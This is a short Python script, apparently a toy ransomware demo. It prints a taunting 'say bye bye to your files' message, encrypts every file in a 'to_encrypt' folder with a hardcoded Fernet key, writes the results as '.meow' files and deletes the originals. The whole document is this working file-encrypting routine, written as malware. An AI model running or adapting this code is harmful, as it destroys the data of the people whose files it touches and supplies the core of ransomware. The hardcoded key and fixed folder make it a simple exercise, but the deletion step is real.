print("Mwahahahahha say bye bye to your files")
from cryptography.fernet import Fernet
import os

# Generate a key and instantiate a Fernet instance
key = b'a4OexdF2N27LLFHt_eFdKe9zK5a98DZuyD2oeJywGJs='
cipher_suite = Fernet(key)

# Define your directory path
directory_path = 'to_encrypt'

# Loop through each file in the directory
for filename in os.listdir(directory_path):
    if not filename.endswith('.meow'):  # Skip already encrypted files
        file_path = os.path.join(directory_path, filename)
        with open(file_path, 'rb') as file:
            file_data = file.read()
            # Encrypt data
            encrypted_data = cipher_suite.encrypt(file_data)
            # Write the encrypted data back to a file with .meow extension
            with open(file_path + '.meow', 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
        # Optionally, remove the original file
        os.remove(file_path)

print("Encryption complete.")
